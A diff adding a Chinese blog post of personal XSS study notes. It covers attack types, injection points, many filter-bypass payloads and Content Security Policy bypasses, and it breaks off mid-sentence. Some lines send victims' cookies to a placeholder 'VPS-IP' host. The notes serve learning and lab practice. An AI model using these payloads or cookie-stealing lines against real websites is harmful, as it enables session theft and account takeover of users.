@@ -64,6 +64,351 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-xssnote" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/08/10/xssnote/" class="article-date">
+  <time datetime="2023-08-10T12:33:59.000Z" itemprop="datePublished">2023-08-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/08/10/xssnote/">2023/08/10：xss笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="xss笔记"><a href="#xss笔记" class="headerlink" title="xss笔记"></a>xss笔记</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>将恶意脚本注入受害者浏览器，使其在浏览器中运行</p>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>1.存储型<br>恶意代码上传至后端，当管理员查询信息时触发<br>如：利用GET、POST或在Referer（xsslab 11）、Cookie（xsslab 13）植入<br>2.反射型<br>需要用户点击触发，在前端显示，一般盗取用户Cookie，较为常见<br>如：<br>假设有如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo $_GET[&#x27;name&#x27;]; ?&gt;</span><br></pre></td></tr></table></figure>
+<p>恶意代码就可以通过GET显示在前端界面<br>3.DOM型<br>不经过后端，利用文档对象模型，属于较特殊的反射型xss<br>如：document.write()函数<br>（burplab好像不少这种题）<br>4.JSONP型<br>按原作者的话较为罕见，浏览器设置了CSP同源策略不允许调用其他域名API时，利用JSONP协议跨域加载特性在JSONP注入恶意代码<br>如：<br>API端口“<a target="_blank" rel="noopener" href="http://evi1s7.com/api%E2%80%9D%E8%BF%94%E5%9B%9E%E5%A6%82%E4%B8%8BJSONP%E5%93%8D%E5%BA%94%EF%BC%9A">http://Evi1s7.com/api”返回如下JSONP响应：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(&#123; &quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30 &#125;)</span><br></pre></td></tr></table></figure>
+<p>可构造如下url执行脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://Evi1s7.com/api?callback=attackerFunction</span><br></pre></td></tr></table></figure>
+<p>这样返回的JSONP响应发生修改：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacjerFunction(&#123; &quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30 &#125;);</span><br></pre></td></tr></table></figure>
+<p>就可以在页面定义attacjerFunction注入恶意脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function attackerFunction(data) &#123;</span><br><span class="line">  document.cookie = &quot;sessionID=&quot; + data.name;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="攻击对象"><a href="#攻击对象" class="headerlink" title="攻击对象"></a>攻击对象</h3><p>又名把xss插到哪</p>
+<h4 id="HTML的注释"><a href="#HTML的注释" class="headerlink" title="HTML的注释"></a>HTML的注释</h4><p>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 2333 --&gt;</span><br><span class="line">&lt;!-- </span><br><span class="line">&lt;script&gt;</span><br><span class="line">  alert(&#x27;1&#x27;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h4><p>例如将代码插入到标签的onerror属性中，无法显示图片时就会调用该代码</p>
+<h4 id="HTML属性名"><a href="#HTML属性名" class="headerlink" title="HTML属性名"></a>HTML属性名</h4><p>利用闭合的方式可以插入属性名执行<br>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; onclick=&quot;alert(&#x27;1&#x27;)&quot; name=&quot;&gt;&lt;script&gt;alert(&#x27;XSS攻击成功！&#x27;)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>插入后前半部分完整，可以执行后半部分的脚本</p>
+<h4 id="HTML标签名"><a href="#HTML标签名" class="headerlink" title="HTML标签名"></a>HTML标签名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;script&gt;alert(&#x27;1&#x27;)&lt;/script&gt;img src=1&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码中，浏览器会将第一个尖括号视为标签名的起始符号，而第二个尖括号则是script标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现我们的XSS攻击</p>
+<h4 id="直接插入"><a href="#直接插入" class="headerlink" title="直接插入"></a>直接插入</h4><p>直接插入script，不带改的</p>
+<h4 id="插入css"><a href="#插入css" class="headerlink" title="插入css"></a>插入css</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(&#x27;javascript:alert(&#x27;1&#x27;)&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>当css样式能插入url时，用户打开这个界面浏览器就会执行脚本</p>
+<h4 id="插入响应（HTTP报头注入）"><a href="#插入响应（HTTP报头注入）" class="headerlink" title="插入响应（HTTP报头注入）"></a>插入响应（HTTP报头注入）</h4><p>利用报头注入漏洞通过注入CRLF字符（回车、换行）向HTTP响应注入任意HTTP头或响应体，来改变响应内容<br>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp:?key=aaa</span><br></pre></td></tr></table></figure>
+<p>若该利用GET的形式传参的网站存在CRLF漏洞，那么我们就可以利用回车符/换行符进行绕过过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=%0d%0a%0d%0a&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<p>返回包如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date:xxxxxxxxxx</span><br><span class="line"></span><br><span class="line">Content-type:text/html</span><br><span class="line"></span><br><span class="line">Contet-Length:xxx</span><br><span class="line"></span><br><span class="line">Connection:close</span><br><span class="line"></span><br><span class="line">Location:</span><br><span class="line"></span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
+<p>http包分为了header和body，成功执行了body中的代码，实现XSS</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h4><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>如xsslab第6题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br></pre></td></tr></table></figure>
+<p>str_replace()需要区分大小写</p>
+<h5 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h5><p>1.eval</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>2.top</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>3.window</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>4.self</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>5.parent</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>6.frames</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="嵌套替换"><a href="#嵌套替换" class="headerlink" title="嵌套替换"></a>嵌套替换</h5><p>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(&#x27;Evi1s7&#x27;)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="赋值绕过"><a href="#赋值绕过" class="headerlink" title="赋值绕过"></a>赋值绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src onerror=_=alert,_(1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=top[x+y](1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。</span><br><span class="line">&lt;img src onerror=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b+a](&#x27;alert(1)&#x27;)&gt;</span><br><span class="line">&lt;img src onerror=[&#x27;ale&#x27;+&#x27;rt&#x27;].map(top[&#x27;ev&#x27;+&#x27;al&#x27;])[0][&#x27;valu&#x27;+&#x27;eOf&#x27;]()(1)&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><h5 id="HTML编码转义"><a href="#HTML编码转义" class="headerlink" title="HTML编码转义"></a>HTML编码转义</h5><p>当可控点为单个标签属性时，可以使用 html 实体编码。<br>可采用十进制、十六进制或填充0的方式<br>填充0：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&gt;aaa&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h5><p>需要注入点存在href属性或者src属性，才可以利用url编码转义且在url解析过程中，不能对协议类型进行任何的编码操作<br>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:%61%6c%65%72%74%28%31%29&gt;233&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>src属性通常用于指定外部资源的URL，让浏览器从指定的URL中获取资源并加载它们（如img、script标签）<br>href属性通常用于指定链接目标的URL或外部资源的URL，以及用于指定基准URL或图像地图中区域的URL（如link、a标签）</p>
+<h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>在html的标签中的不同位置的空格绕过方式不是一样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>A： /，/123/，%09，%0A，%0C，%0D，%20<br>B：%09，%0A，%0C，%0D，%20<br>C：%0B，/**/ （如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20）<br>D：%09，%0A，%0C，%0D，%20，//，&gt;</p>
+<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="()绕过"></a>()绕过</h4><h5 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert`1`</span><br></pre></td></tr></table></figure>
+<h5 id="throw绕过"><a href="#throw绕过" class="headerlink" title="throw绕过"></a>throw绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="alert绕过（关键词过滤绕过的特殊情况）"><a href="#alert绕过（关键词过滤绕过的特殊情况）" class="headerlink" title="alert绕过（关键词过滤绕过的特殊情况）"></a>alert绕过（关键词过滤绕过的特殊情况）</h4><h5 id="函数替换-1"><a href="#函数替换-1" class="headerlink" title="函数替换"></a>函数替换</h5><p>可用prompt()、confirm()、console.log()、document.write()</p>
+<h5 id="编码绕过-1"><a href="#编码绕过-1" class="headerlink" title="编码绕过"></a>编码绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:%61%6c%65%72%74%28%31%29&gt;aaa&lt;/a&gt;</span><br><span class="line">#alert(1)</span><br></pre></td></tr></table></figure>
+<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><h5 id="拆分"><a href="#拆分" class="headerlink" title="拆分"></a>拆分</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;rt&gt;1&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(a)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="eval-拼接"><a href="#eval-拼接" class="headerlink" title="eval()拼接"></a>eval()拼接</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;a href=http://VPS-IP:port&gt;1&lt;/a&gt;&quot;)</span><br></pre></td></tr></table></figure>
+<h4 id="分号过滤"><a href="#分号过滤" class="headerlink" title="分号过滤"></a>分号过滤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>CSP指的是Content Security Policy，即内容安全策略。CSP指令可以在HTTP响应头中设置，也可以在HTML文档中使用meta标签设置，让管理员可以告诉浏览器哪些资源可以加载到页面中，例如可以信任哪些来源的JavaScript、CSS、图片等资源。这样，浏览器就只会加载来自这些受信任来源的资源，从而减少了被攻击的风险。</p>
+<h5 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h5><p>1.Content-Security-Policy:配置好并且启用后，直接拦截不符合CSP的资源<br>2.Content-Security-Policy-Report-Only：配置好之后仅记录违反限制的行为，并不能进行拦截(这里也是一个漏洞)，和report-uri选项配合时可以进行拦截违法行为</p>
+<h5 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h5><p>CSP由一组指令组成，每个指令用于指定允许加载的资源类型和来源，一个CSP头由多组CSP策略组成，中间由分号分隔。</p>
+<p>指令关键字：指令关键字用于标识指令类型，例如default-src、script-src、style-src等<br>指令值：指令值用于指定允许加载资源的来源，可以是一个或多个来源，多个来源之间用空格分隔。来源可以是URL、域名、IP地址或通配符等<br>指令选项：指令选项用于指定一些特殊行为，例如’self’选项用于指定资源只能从同一域名加载，’unsafe-inline’选项用于允许内联脚本等<br>指令策略：指令策略用于指定如何处理不符合CSP策略的请求，可以选择’allow’、’block’、’report’等选项，每一组策略包含一个策略指令和一个内容源列表<br>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; example.com; img-src * data:; report-uri /csp-report</span><br></pre></td></tr></table></figure>
+<p>Content-Security-Policy是CSP的header字段<br>default-src指令用于限制默认允许加载的资源类型和来源<br>script-src指令用于限制JavaScript脚本的来源<br>img-src指令用于限制图片的来源<br>策略还指定了违规报告的URL</p>
+<h5 id="常见策略指令"><a href="#常见策略指令" class="headerlink" title="常见策略指令"></a>常见策略指令</h5><p>与特定的源（例如域名、协议、端口）一起使用或使用通配符（*）来表示所有来源<br>default-src: 指定默认允许加载的资源类型和来源。<br>script-src: 限制JavaScript脚本的来源。<br>style-src: 限制CSS样式表的来源。<br>img-src: 限制图片的来源。<br>connect-src: 限制XMLHttpRequest和WebSocket的来源。<br>font-src: 限制字体的来源。<br>object-src: 限制object、embed、applet等插件的来源。<br>media-src: 限制音频、视频等媒体资源的来源。<br>frame-src: 限制iframe的来源。<br>child-src: 限制子窗口的来源，包括iframe、web worker、embed等。<br>form-action: 限制表单提交的目标地址。<br>sandbox: 限制iframe中的脚本和插件的执行权限。<br>base-uri: 限制base标签的目标地址。<br>report-uri: 指定违规报告的URL。</p>
+<h5 id="策略指令中常见的关键词"><a href="#策略指令中常见的关键词" class="headerlink" title="策略指令中常见的关键词"></a>策略指令中常见的关键词</h5><p>用于指定资源的类型和来源<br>1.self: 表示当前网站的源，也就是只允许从同一域名加载资源。<br>2.none: 表示不允许加载任何资源。<br>3.unsafe-inline: 表示允许内联脚本、样式表等，但存在安全风险。<br>4.unsafe-eval: 表示允许使用eval()函数执行代码，但存在安全风险。<br>5.strict-dynamic: 表示允许通过nonce或hash机制执行动态脚本，但不允许其他方式的动态脚本。<br>6.nonce-xxxx: 表示允许执行指定的nonce值所对应的脚本，用于限制内联脚本的来源。<br>7.hash-xxxx: 表示允许执行指定的哈希值所对应的脚本，用于限制外部脚本的来源。<br>8.data:: 表示允许加载data URI格式的资源。<br>9.blob:: 表示允许加载blob URL格式的资源。<br>10.mediastream:: 表示允许加载mediastream格式的资源</p>
+<h5 id="CSP策略指令中的存在安全风险数据类型"><a href="#CSP策略指令中的存在安全风险数据类型" class="headerlink" title="CSP策略指令中的存在安全风险数据类型"></a>CSP策略指令中的存在安全风险数据类型</h5><p>1.data:用于指定可以从data URI格式加载的资源。data URI可以直接将资源的内容编码为字符串嵌入到URL中，而不需要从外部加载资源<br>作为攻击者，可以利用data uri构造恶意脚本直接嵌入URL中，从而进行XSS攻击<br>2.mediastream:用于指定可以从哪些媒体流（例如摄像头或麦克风）加载资源。配合media-src策略指令使用，允许 mediastream: URI 作为内容来源。<br>3.blob:允许在HTML页面中使用Blob URL，这是一种允许在浏览器中生成URL的API。当CSP策略允许任何来源使用blob数据类型时，会产生安全风险。<br>4.unsafe-inline:允许在HTML页面中直接嵌入JavaScript代码。这是一种方便的方法，可以将脚本与页面混合在一起，但是也容易受到XSS攻击的威胁。<br>5.unsafe-eval:允许在HTML页面中使用eval函数来执行JavaScript代码，攻击者可以通过注入特殊的参数（数据注入攻击）来控制eval函数的执行结果，从而达到执行恶意代码的目的。</p>
+<h5 id="绕过策略"><a href="#绕过策略" class="headerlink" title="绕过策略"></a>绕过策略</h5><p>1.iframe标签<br>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--1.php--&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if (!isset($_COOKIE[&#x27;Evi1s7&#x27;])) &#123;</span><br><span class="line">        setcookie(&#x27;Ev1ls7&#x27;,md5(rand(0,1000)));</span><br><span class="line">    &#125;</span><br><span class="line">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;CSP&lt;/p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#x27;Evi1s7&#x27;])) &#123;</span><br><span class="line">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;Evi1s7&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--2.php--&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;CSP&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#x27;Evi1s7&#x27;])) &#123;</span><br><span class="line">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;Evi1s7&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure>
+<p>该代码对于2.php没有进行设置，可利用iframe特性（在HTML文档中iframe每出现一次，一个IFrame对象就会被创建，可以使用 document.createElement()方法来创建）<br>创建一个iframe标签将其嵌入到DOM文档的body元素中，通过设置iframe标签的属性使浏览器渲染1.php，iframe也会内嵌到页面中<br>2.location绕过（unsafe-inline存在安全风险的利用）<br>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;</span><br></pre></td></tr></table></figure>
+<p>可以利用location.href/window.location/window.open 绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;script&gt;window.location.href=&#x27;http://VPS-IP:port&#x27;+escape(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>3.link标签<br>适用于可以执行JavaScript脚本，但是无法将CSP数据带出<br>以firefox为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>以如下带出cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var link = document.createElement(&quot;link&quot;);</span><br><span class="line">link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class="line">link.setAttribute(&quot;href&quot;, &quot;//VPS-IP/?&quot; + document.cookie);</span><br><span class="line">document.head.appendChild(link)</span><br></pre></td></tr></table></figure>
+<p>href属性被设定为设置一个超链接，当被点击是，会以GET的形式请求我们的VPS，且带着用户自己的cookie值作为查询字符串附加在URL的末尾。<br>4.低版本CDN绕过<br>如果此CDN服务商在CSP白名单中<br>如：<br>以Jquery-mobile库为例，如果题目给出的CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，可以以</p>
